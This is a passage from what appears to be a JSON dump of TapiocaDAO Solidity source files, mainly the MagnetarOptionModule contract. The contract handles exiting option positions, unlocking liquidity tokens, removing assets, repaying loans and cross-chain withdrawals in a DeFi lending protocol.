= bigBang_.collateralId();\n            uint256 collateralShare = yieldBox_.toShare(_collateralId, data.removeAndRepayData.collateralAmount, false);\n            address removeCollateralTo =\n                data.removeAndRepayData.collateralWithdrawData.withdraw ? address(this) : data.user;\n\n            (Module[] memory modules, bytes[] memory calls) = IMarketHelper(data.externalData.marketHelper)\n                .removeCollateral(data.user, removeCollateralTo, collateralShare);\n            bigBang_.execute(modules, calls, true);\n\n            //withdraw\n            if (data.removeAndRepayData.collateralWithdrawData.withdraw) {\n                uint256 computedAmount = yieldBox_.toAmount(_collateralId, collateralShare, false);\n                data.removeAndRepayData.collateralWithdrawData.lzSendParams.sendParam.amountLD = computedAmount;\n                data.removeAndRepayData.collateralWithdrawData.lzSendParams.sendParam.minAmountLD = computedAmount;\n                _withdrawToChain(data.removeAndRepayData.collateralWithdrawData);\n            }\n        }\n        _revertYieldBoxApproval(address(bigBang_), yieldBox_);\n    }\n}"
    },
    {
      "filename": "Tapioca-bar/gitmodule/tapioca-periph/contracts/Magnetar/modules/MagnetarOptionModule.sol",
      "content": "// SPDX-License-Identifier: UNLICENSED\npragma solidity 0.8.22;\n\n// External\nimport {SafeERC20, IERC20} from \"@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol\";\nimport {IERC721} from \"@openzeppelin/contracts/token/ERC721/IERC721.sol\";\nimport {Ownable} from \"@openzeppelin/contracts/access/Ownable.sol\";\n\n// Tapioca\nimport {ITapiocaOptionLiquidityProvision} from\n    \"tapioca-periph/interfaces/tap-token/ITapiocaOptionLiquidityProvision.sol\";\nimport {\n    ExitPositionAndRemoveCollateralData, MagnetarWithdrawData\n} from \"tapioca-periph/interfaces/periph/IMagnetar.sol\";\nimport {ITapiocaOptionBroker} from \"tapioca-periph/interfaces/tap-token/ITapiocaOptionBroker.sol\";\nimport {ITapiocaOption} from \"tapioca-periph/interfaces/tap-token/ITapiocaOption.sol\";\nimport {IMarketHelper} from \"tapioca-periph/interfaces/bar/IMarketHelper.sol\";\nimport {ISingularity} from \"tapioca-periph/interfaces/bar/ISingularity.sol\";\nimport {IYieldBox} from \"tapioca-periph/interfaces/yieldbox/IYieldBox.sol\";\nimport {IMarket, Module} from \"tapioca-periph/interfaces/bar/IMarket.sol\";\nimport {MagnetarBaseModule} from \"./MagnetarBaseModule.sol\";\n\n/*\n\n████████╗ █████╗ ██████╗ ██╗ ██████╗  ██████╗ █████╗ \n╚══██╔══╝██╔══██╗██╔══██╗██║██╔═══██╗██╔════╝██╔══██╗\n   ██║   ███████║██████╔╝██║██║   ██║██║     ███████║\n   ██║   ██╔══██║██╔═══╝ ██║██║   ██║██║     ██╔══██║\n   ██║   ██║  ██║██║     ██║╚██████╔╝╚██████╗██║  ██║\n   ╚═╝   ╚═╝  ╚═╝╚═╝     ╚═╝ ╚═════╝  ╚═════╝╚═╝  ╚═╝\n   \n*/\n\n/**\n * @title MagnetarOptionModule\n * @author TapiocaDAO\n * @notice Magnetar options related operations\n */\ncontract MagnetarOptionModule is MagnetarBaseModule {\n    using SafeERC20 for IERC20;\n\n    error Magnetar_ActionParamsMismatch();\n    error Magnetar_tOLPTokenMismatch();\n    error Magnetar_MarketCallFailed(bytes call);\n\n    /**\n     * @notice helper to exit from  tOB, unlock from tOLP, remove from SGL, repay on BB, remove collateral from BB and withdraw\n     * @dev all steps are optional:\n     *         - if `removeAndRepayData.exitData.exit` is false, the exit operation is skipped\n     *         - if `removeAndRepayData.unlockData.unlock` is false, the unlock operation is skipped\n     *         - if `removeAndRepayData.removeAssetFromSGL` is false, the removeAsset operation is skipped\n     *         - if `!removeAndRepayData.assetWithdrawData.withdraw && removeAndRepayData.repayAssetOnBB`, the repay operation is performed\n     *         - if `removeAndRepayData.removeCollateralFromBB` is false, the rmeove collateral is skipped\n     *     - the helper can either stop at the remove asset from SGL step or it can continue until is removes & withdraws collateral from BB\n     *         - removed asset can be withdrawn by providing `removeAndRepayData.assetWithdrawData`\n     *     - BB collateral can be removed by providing `removeAndRepayData.collateralWithdrawData`\n     */\n    function exitPositionAndRemoveCollateral(ExitPositionAndRemoveCollateralData memory data) public payable {\n        // Check sender\n        _checkSender(data.user);\n\n        // Check whitelisted\n        if (data.externalData.bigBang != address(0)) {\n            if (!cluster.isWhitelisted(0, data.externalData.bigBang)) {\n                revert Magnetar_TargetNotWhitelisted(data.externalData.bigBang);\n            }\n        }\n        if (data.externalData.singularity != address(0)) {\n            if (!cluster.isWhitelisted(0, data.externalData.singularity)) {\n                revert Magnetar_TargetNotWhitelisted(data.externalData.singularity);\n            }\n        }\n\n        IMarket bigBang_ = IMarket(data.externalData.bigBang);\n        ISingularity singularity_ = ISingularity(data.externalData.singularity);\n        IYieldBox yieldBox_ = IYieldBox(singularity_.yieldBox());\n\n        // if `removeAndRepayData.exitData.exit` the following operations are performed\n        //      - if ownerOfTapTokenId is user, transfers the oTAP token id to this contract\n        //      - tOB.exitPosition\n        //      - if `!removeAndRepayData.unlockData.unlock`, transfer the obtained tokenId to the user\n        uint256 tOLPId = 0;\n        if (data.removeAndRepayData.exitData.exit) {\n            if (data.removeAndRepayData.exitData.oTAPTokenID == 0) revert Magnetar_ActionParamsMismatch();\n            if (!cluster.isWhitelisted(0, data.removeAndRepayData.exitData.target)) {\n                revert Magnetar_TargetNotWhitelisted(data.removeAndRepayData.exitData.target);\n            }\n\n            address oTapAddress = ITapiocaOptionBroker(data.removeAndRepayData.exitData.target).oTAP();\n            (, ITapiocaOption.TapOption memory oTAPPosition) =\n                ITapiocaOption(oTapAddress).attributes(data.removeAndRepayData.exitData.oTAPTokenID);\n\n            tOLPId = oTAPPosition.tOLP;\n\n            address ownerOfTapTokenId = IERC721(oTapAddress).ownerOf(data.removeAndRepayData.exitData.oTAPTokenID);\n\n            if (ownerOfTapTokenId != data.user && ownerOfTapTokenId != address(this)) {\n                revert Magnetar_ActionParamsMismatch();\n            }\n            if (ownerOfTapTokenId == data.user) {\n                // IERC721(oTapAddress).safeTransferFrom(\n                //     data.user, address(this), data.removeAndRepayData.exitData.oTAPTokenID, \"0x\"\n                // );\n                pearlmit.transferFromERC721(\n                    data.user, address(this), oTapAddress, data.removeAndRepayData.exitData.oTAPTokenID\n                );\n            }\n            ITapiocaOptionBroker(data.removeAndRepayData.exitData.target).exitPosition(\n                data.removeAndRepayData.exitData.oTAPTokenID\n            );\n\n            if (!data.removeAndRepayData.unlockData.unlock) {\n                address tOLPContract = ITapiocaOptionBroker(data.removeAndRepayData.exitData.target).tOLP();\n\n                //transfer tOLP to the data.user\n                IERC721(tOLPContract).safeTransferFrom(address(this), data.user, tOLPId, \"0x\");\n            }\n        }\n\n        // performs a tOLP.unlock operation\n        if (data.removeAndRepayData.unlockData.unlock) {\n            if (!cluster.isWhitelisted(0, data.removeAndRepayData.unlockData.target)) {\n                revert Magnetar_TargetNotWhitelisted(data.removeAndRepayData.unlockData.target);\n            }\n\n            if (data.removeAndRepayData.unlockData.tokenId != 0) {\n                if (tOLPId != 0) {\n                    if (tOLPId != data.removeAndRepayData.unlockData.tokenId) {\n                        revert Magnetar_tOLPTokenMismatch();\n                    }\n                }\n                tOLPId = data.removeAndRepayData.unlockData.tokenId;\n            }\n\n            address ownerOfTOLP = IERC721(data.removeAndRepayData.unlockData.target).ownerOf(tOLPId);\n\n            if (ownerOfTOLP != data.user && ownerOfTOLP != address(this)) {\n                revert Magnetar_ActionParamsMismatch();\n            }\n\n            ITapiocaOptionLiquidityProvision(data.removeAndRepayData.unlockData.target).unlock(\n                tOLPId, data.externalData.singularity, data.user\n            );\n        }\n\n        // if `data.removeAndRepayData.removeAssetFromSGL` performs the follow operations:\n        //      - removeAsset from SGL\n        //      - if `data.removeAndRepayData.assetWithdrawData.withdraw` withdraws by using the `withdrawTo` operation\n        uint256 _removeAmount = data.removeAndRepayData.removeAmount;\n        if (data.removeAndRepayData.removeAssetFromSGL) {\n            uint256 _assetId = singularity_.assetId();\n            uint256 share = yieldBox_.toShare(_assetId, _removeAmount, false);\n\n            address removeAssetTo = data.removeAndRepayData.assetWithdrawData.withdraw\n                || data.removeAndRepayData.repayAssetOnBB ? address(this) : data.user;\n\n            singularity_.removeAsset(data.user, removeAssetTo, share);\n\n            //withdraw\n            if (data.removeAndRepayData.assetWithdrawData.withdraw) {\n                uint256 computedAmount = yieldBox_.toAmount(_assetId, share, false);\n                data.removeAndRepayData.assetWithdrawData.lzSendParams.sendParam.amountLD = computedAmount;\n                data.removeAndRepayData.assetWithdrawData.lzSendParams.sendParam.minAmountLD = computedAmount;\n                _withdrawToChain(data.removeAndRepayData.assetWithdrawData);\n            }\n        }\n\n        // performs a BigBang repay operation\n        if (!data.removeAndRepayData.assetWithdrawData.withdraw && data.removeAndRepayData.repayAssetOnBB) {\n            _setApprovalForYieldBox(address(bigBang_), yieldBox_);\n\n            (Module[] memory modules, bytes[] memory calls) = IMarketHelper(data.externalData.marketHelper).repay(\n                address(this), data.user, false, data.removeAndRepayData.repayAmount\n            );\n            (bool[] memory successes, bytes[] memory results) = bigBang_.execute(modules, calls, true);\n\n            if (!successes[0]) revert Magnetar_MarketCallFailed(calls[0]);\n            uint256 repayed = IMarketHelper(data.externalData.marketHelper).repayView(results[0]);\n            // transfer excess amount to the data.user\n            if (repayed < _removeAmount) {\n                uint256 bbAssetId = bigBang_.assetId();\n                yieldBox_.transfer(\n                    address(this), data.user, bbAssetId, yieldBox_.toShare(bbAssetId, _removeAmount - re"
    }
  ]
}